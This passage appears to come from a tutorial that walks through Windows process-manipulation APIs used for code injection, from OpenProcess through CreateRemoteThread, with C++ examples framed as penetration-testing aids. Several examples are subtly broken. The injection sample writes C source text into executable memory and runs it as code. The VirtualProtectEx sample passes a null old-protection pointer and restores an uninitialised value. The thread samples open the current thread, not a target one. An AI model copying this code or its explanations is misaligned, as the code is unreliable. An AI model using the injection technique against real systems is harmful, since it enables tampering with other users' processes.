Using CreateProcessA, we initiate the process using the specified executable path and command-line arguments. Upon success, it creates a new process and provides information about it through the PROCESS_INFORMATION structure.

We display the process ID (PID) of the newly launched process on the console.

Finally, to prevent resource leaks, we close the handles to the process and thread

## OpenProcess

The OpenProcess API in C++ is employed to acquire a handle to an active process. This functionality proves beneficial in cybersecurity and penetration testing scenarios where there is a necessity to interact with or manage other processes running on a Windows system. Here's an example demonstrating how to utilize OpenProcess:

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    DWORD processId; // Replace with the target process ID
    HANDLE hProcess;

    // Replace 'processId' with the PID of the target process
    processId = 1234; // Example PID

    // Open the target process with PROCESS_QUERY_INFORMATION access rights
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);

    if (hProcess == NULL) {
        std::cerr << "Failed to open the target process. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "Successfully opened the target process with handle: " << hProcess << std::endl;

    // Perform operations on the target process as needed

    // Close the handle when done with it
    CloseHandle(hProcess);

    return 0;
}
```

## DuplicateHandle

The DuplicateHandle API in C++ is utilized to create a duplicate of a handle to an object, such as a process, thread, or file. This functionality is valuable in cybersecurity and penetration testing for tasks that involve sharing handles between processes or executing operations on the duplicated handle independently of the original. Here's an example illustrating the usage of DuplicateHandle:

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/handleapi/nf-handleapi-duplicatehandle)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    HANDLE hProcess; // Replace with the source process handle
    HANDLE hDuplicateProcess = NULL;

    // Replace 'hProcess' with the source process handle you want to duplicate
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());

    if (hProcess == NULL) {
        std::cerr << "Failed to open the source process. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    // Duplicate the handle
    if (DuplicateHandle(GetCurrentProcess(), hProcess, GetCurrentProcess(), &hDuplicateProcess, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
        std::cout << "Handle duplicated successfully!" << std::endl;
        
        // Perform operations using the duplicated handle (hDuplicateProcess) as needed

        // Close the duplicated handle when done with it
        CloseHandle(hDuplicateProcess);
    } else {
        std::cerr << "DuplicateHandle failed. Error code: " << GetLastError() << std::endl;
    }

    // Close the source process handle
    CloseHandle(hProcess);

    return 0;
}
```

Replace hProcess with the handle of the source process you wish to duplicate. In this example, we use OpenProcess to obtain the handle of the current process for demonstration purposes.

We invoke OpenProcess to acquire the handle of the source process, granting PROCESS_QUERY_INFORMATION access rights. Adjust the access rights and retrieve the source process handle based on specific requirements.

After calling OpenProcess, we verify its success in obtaining the source process handle. If unsuccessful, we print an error message containing the error code retrieved from GetLastError().

Using DuplicateHandle, we duplicate the handle of the source process (hProcess) into the current process (GetCurrentProcess()). The duplicated handle is stored in hDuplicateProcess.

Upon a successful duplication by DuplicateHandle, we utilize the duplicated handle (hDuplicateProcess) to execute operations on the source process as necessary.

Finally, we close both the source process handle (hProcess) and the duplicated handle (hDuplicateProcess) when they are no longer needed, ensuring the release of associated resources.

## VirtualAllocEx

The VirtualAllocEx API in C++ is utilized to reserve memory within the address space of a designated process. This functionality is advantageous in cybersecurity and penetration testing scenarios where there is a requirement to allocate memory in a different process for tasks like code injection or memory analysis. Here's an example demonstrating how to employ VirtualAllocEx:

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)


### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    HANDLE hProcess; // Replace with the target process handle
    LPVOID lpBaseAddress = NULL; // Request any available address
    SIZE_T dwSize = 4096; // Allocate 4 KB (adjust as needed)
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE; // Adjust protection as needed

    // Replace 'hProcess' with the target process handle you want to allocate memory in
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234); // Replace '1234' with the target process ID

    if (hProcess == NULL) {
        std::cerr << "Failed to open the target process. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    LPVOID lpRemoteBuffer = VirtualAllocEx(hProcess, lpBaseAddress, dwSize, flAllocationType, flProtect);

    if (lpRemoteBuffer == NULL) {
        std::cerr << "VirtualAllocEx failed. Error code: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Memory allocated successfully in the target process at address: " << lpRemoteBuffer << std::endl;

    // Perform operations using the allocated memory in the target process as needed

    // Free the allocated memory when done
    VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);

    // Close the target process handle
    CloseHandle(hProcess);

    return 0;
}
```

## VirtualProtectEx

The VirtualProtectEx API in C++ is employed to alter the protection attributes of a memory region within the address space of a designated process. This functionality proves beneficial in cybersecurity and penetration testing contexts when there is a necessity to adjust memory protection attributes in another process for tasks like code injection or memory manipulation. Here's an example illustrating how to utilize VirtualProtectEx:

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    HANDLE hProcess; // Replace with the target process handle
    LPVOID lpAddress = nullptr; // Address of the memory region to protect
    SIZE_T dwSize = 4096; // Size of the memory region (adjust as needed)
    DWORD flNewProtect = PAGE_EXECUTE_READWRITE; // New protection attributes

    // Replace 'hProcess' with the target process handle you want to modify memory protection in
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234); // Replace '1234' with the target process ID

    if (hProcess == NULL) {
        std::cerr << "Failed to open the target process. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    if (VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, nullptr)) {
        std::cout << "Memory protection attributes modified successfully." << std::endl;

        // Perform operations on the protected memory as needed

        // Restore the original protection attributes if necessary
        DWORD flOldProtect;
        VirtualProtectEx(hProcess, lpAddress, dwSize, flOldProtect, nullptr);
    } else {
        std::cerr << "VirtualProtectEx failed. Error code: " << GetLastError() << std::endl;
    }

    // Close the target process handle
    CloseHandle(hProcess);

    return 0;
}
```

## SetThreadContext

The SetThreadContext API in C++ is employed to adjust the context of a specific thread, encompassing register values and flags. This functionality is valuable in cybersecurity and penetration testing for tasks like adjusting thread behavior or manipulating execution flow within a targeted process. However, it's crucial to recognize that using this API for unauthorized or malicious intents can lead to significant legal and ethical consequences. Here's an example demonstrating the usage of SetThreadContext:

[Learn Microsoft Link](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    DWORD processId; // Replace with the target process ID
    HANDLE hProcess, hThread;

    // Replace 'processId' with the PID of the target process
    processId = 1234; // Example PID

    // Open the target process with PROCESS_ALL_ACCESS access rights
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

    if (hProcess == NULL) {
        std::cerr << "Failed to open the target process. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    // Open a thread within the target process (e.g., the primary thread)
    hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId()); // Replace with the target thread ID

    if (hThread == NULL) {
        std::cerr << "Failed to open the target thread. Error code: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Define a CONTEXT structure to store the thread context
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL; // Retrieve full context

    // Get the current context of the target thread
    if (!GetThreadContext(hThread, &context)) {
        std::cerr << "GetThreadContext failed. Error code: " << GetLastError() << std::endl;
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // Modify the context as needed
    // For example, you can change register values or flags in the 'context' structure here

    // Set the modified context back to the target thread
    if (!SetThreadContext(hThread, &context)) {
        std::cerr << "SetThreadContext failed. Error code: " << GetLastError() << std::endl;
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Thread context modified successfully." << std::endl;

    // Close handles when done
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

## QueueUserAPC

The QueueUserAPC (Asynchronous Procedure Call) API in C++ is utilized to schedule the execution of a user-defined function within the address space of a designated thread. This functionality is advantageous in cybersecurity and penetration testing when there is a need to inject and execute code within a target process for diverse purposes. However, it is crucial to note that manipulating remote processes without appropriate authorization can result in severe legal and ethical ramifications. Here's an example demonstrating how to employ QueueUserAPC:

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc2)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

// Define a custom APC function to be executed within the target thread
VOID CALLBACK CustomAPCFunction(ULONG_PTR dwParam) {
    // Code to be executed within the target thread
    std::cout << "Custom APC function executed within the target thread." << std::endl;
}

int main() {
    DWORD processId; // Replace with the target process ID
    HANDLE hProcess, hThread;

    // Replace 'processId' with the PID of the target process
    processId = 1234; // Example PID

    // Open the target process with PROCESS_ALL_ACCESS access rights
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

    if (hProcess == NULL) {
        std::cerr << "Failed to open the target process. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    // Open a thread within the target process (e.g., the primary thread)
    hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId()); // Replace with the target thread ID

    if (hThread == NULL) {
        std::cerr << "Failed to open the target thread. Error code: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Queue the custom APC function to be executed within the target thread
    if (QueueUserAPC(CustomAPCFunction, hThread, 0)) {
        std::cout << "APC function queued successfully." << std::endl;

        // Trigger the APC by suspending and resuming the target thread
        SuspendThread(hThread);
        ResumeThread(hThread);
    } else {
        std::cerr << "QueueUserAPC failed. Error code: " << GetLastError() << std::endl;
    }

    // Close handles when done
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

## CreateRemoteThread 

The CreateRemoteThread API in C++ is used to create a new thread within the address space of a specified remote process, allowing you to inject and execute code within that process. This can be useful in cybersecurity and penetration testing when you need to manipulate or analyze the behavior of a target process. However, please be aware that manipulating remote processes without proper authorization can have serious legal and ethical implications. Here's an example of how to use CreateRemoteThread:

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    DWORD processId; // Replace with the target process ID
    HANDLE hProcess;

    // Replace 'processId' with the PID of the target process
    processId = 1234; // Example PID

    // Open the target process with PROCESS_ALL_ACCESS access rights
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

    if (hProcess == NULL) {
        std::cerr << "Failed to open the target process. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    // Define the code to be executed within the target process
    // In this example, we create a simple thread that displays a message box
    const char* codeToInject = R"(
        #include <windows.h>
        int main() {
            MessageBoxA(NULL, "Injected Code", "Injection Example", MB_ICONINFORMATION);
            return 0;
        }
    )";

    // Allocate memory within the target process for the code
    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, strlen(codeToInject) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (pRemoteCode == NULL) {
        std::cerr << "Failed to allocate memory in the target process. Error code: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Write the code to the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteCode, codeToInject, strlen(codeToInject) + 1, NULL)) {
        std::cerr << "Failed to write code to the target process. Error code: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread within the target process to execute the code
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);

    if (hRemoteThread == NULL) {
        std::cerr << "Failed to create a remote thread in the target process. Error code: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Remote thread created successfully." << std::endl;

    // Wait for the remote thread to finish
    WaitForSingleObject(hRemoteThread, INFINITE);

    // Close handles when done
    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}
```

<!-- cSpell:enable -->
